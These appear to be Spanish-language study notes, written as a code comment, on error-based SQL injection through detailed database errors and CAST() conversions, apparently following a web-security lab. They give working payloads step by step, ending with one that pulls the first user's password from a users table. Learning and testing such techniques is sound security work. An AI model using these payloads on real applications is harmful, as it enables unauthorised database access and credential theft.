/*
Extracción de datos sensibles mediante mensajes de error detallados en SQL

La mala configuración de la base de datos a veces resulta en mensajes de error detallados.
Estos pueden proporcionar información que puede ser útil para un atacante. Por ejemplo,
considera el siguiente mensaje de error, que ocurre después de inyectar una comilla simple en un parámetro id:

Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char

Esto muestra la consulta completa que la aplicación construyó usando nuestra entrada.
Podemos ver que, en este caso, estamos inyectando dentro de una cadena entre comillas simples dentro de una
declaración WHERE. Esto facilita la construcción de una consulta válida que contenga una carga maliciosa.
Comentar el resto de la consulta evitaría que la comilla simple superflua rompa la sintaxis.



Ocasionalmente, puedes inducir a la aplicación a generar un mensaje de error que contenga algunos de los
datos que devuelve la consulta. Esto convierte efectivamente una vulnerabilidad de inyección SQL ciega en una visible.

Puedes usar la función CAST() para lograr esto. Te permite convertir un tipo de dato a otro. Por ejemplo,
imagina una consulta que contiene la siguiente declaración:

en vez de colocar el trackingId, colocamos:

CAST((SELECT example_column FROM example_table) AS int) -- '

A menudo, los datos que estás tratando de leer son una cadena de texto. Intentar convertir esto a un tipo
de dato incompatible, como un entero (int), puede causar un error similar al siguiente:

ERROR: invalid input syntax for type integer: "Example data"

Este tipo de consulta también puede ser útil si un límite de caracteres te impide desencadenar respuestas condicionales.



Con esto, procedemos como en error_based_SQLi:
Verificamos el casteo:
xyz' AND CAST((SELECT 1) AS int)--   -> esto arroja error
xyz' AND 1=CAST((SELECT 1) AS int)--   -> esto ya no

Verificamos si tabla existe:
xyz' AND 1=CAST((SELECT username FROM users) AS int)--
Arroja un error, y podriamos ver ademas que la query esta limitada en el numero de caracteres...
para ello podriamos eliminar el trackingId, para dar mas espacio a la query.
' AND 1=CAST((SELECT username FROM users) AS int)--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

Si el admin es el primer item de la tabla, podemos hacer:
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

*/
